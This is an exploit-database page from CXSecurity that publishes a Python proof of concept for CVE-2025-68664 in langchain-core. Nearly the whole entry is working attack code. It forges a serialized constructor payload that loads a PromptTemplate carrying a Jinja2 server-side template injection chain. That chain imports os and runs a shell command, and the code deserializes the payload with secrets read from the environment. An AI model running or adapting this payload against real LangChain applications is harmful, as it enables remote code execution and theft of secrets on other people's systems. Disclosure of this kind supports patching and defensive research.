---
title: LangChain Core - Serialization Injection to Jinja2 SSTI/RCE
url: https://cxsecurity.com/issue/WLB-2026010017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-26
fetch_date: 2026-01-27T03:37:12.621466
---

# LangChain Core - Serialization Injection to Jinja2 SSTI/RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LangChain Core - Serialization Injection to Jinja2 SSTI/RCE**  **2026.01.26**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-68664](https://cxsecurity.com/cveshow/CVE-2025-68664/ "Click to see CVE-2025-68664")**  CWE: **N/A** | |

# Exploit Title: LangChain Core - Serialization Injection to Jinja2 SSTI/RCE
# Date: 2025-12-29
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Contact: @banyamer\_security (Instagram)
# GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://www.langchain.com/
# Software Link: https://pypi.org/project/langchain-core/
# Version: < 0.3.81 and < 1.2.5
# Tested on: Python 3.10 - 3.12
# CVE : CVE-2025-68664
# Description: Exploits unsafe deserialization in langchain\_core.load to instantiate a malicious PromptTemplate
# with Jinja2 format, leading to Server-Side Template Injection and arbitrary command execution.
import os
from langchain\_core.load import dumps, load
from langchain\_core.prompts import PromptTemplate
# Set a dummy env var (demonstrates potential secret access if needed)
os.environ["TEST\_SECRET"] = "secret\_value\_123"
# Malicious constructor payload targeting PromptTemplate with SSTI
payload = {
"exploit": {
"lc": 1,
"type": "constructor",
"id": ["langchain\_core", "prompts", "prompt", "PromptTemplate"],
"kwargs": {
"input\_variables": [],
"template": "{{ config.get('callbacks', {}).get('\_\_builtins\_\_', {}).get('\_\_import\_\_', lambda x: \_\_import\_\_(x))('os').system('id') }}",
"template\_format": "jinja2"
}
}
}
# Serialize (dumps does not escape 'lc' key)
serialized = dumps(payload)
# Deserialize - instantiates the malicious PromptTemplate
deserialized = load(serialized, secrets\_from\_env=True)
# Extract and invoke the malicious prompt → triggers SSTI → RCE
malicious = deserialized["exploit"]
output = malicious.format()
print("[\*] Command execution output:")
print(output)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026010017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top